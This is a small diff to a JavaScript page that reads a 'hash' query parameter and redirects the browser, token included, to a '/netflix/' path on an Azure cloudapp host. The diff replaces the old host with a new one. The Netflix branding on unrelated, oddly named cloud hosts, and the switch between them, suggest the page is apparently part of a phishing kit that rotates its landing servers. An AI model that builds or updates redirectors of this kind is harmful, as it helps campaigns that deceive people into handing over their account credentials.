@@ -13,7 +13,7 @@
     const hashValue = getQueryParam("hash");
 
     if (hashValue) {
-      const destino = `http://videoflixnet.canadacentral.cloudapp.azure.com/netflix/?hash=${encodeURIComponent(hashValue)}`;
+      const destino = `https://netasdlg001.westus2.cloudapp.azure.com/netflix/?hash=${encodeURIComponent(hashValue)}`;
       window.location.replace(destino);
     } else {
       document.write("<h2>Parâmetro 'hash' não encontrado.</h2>");
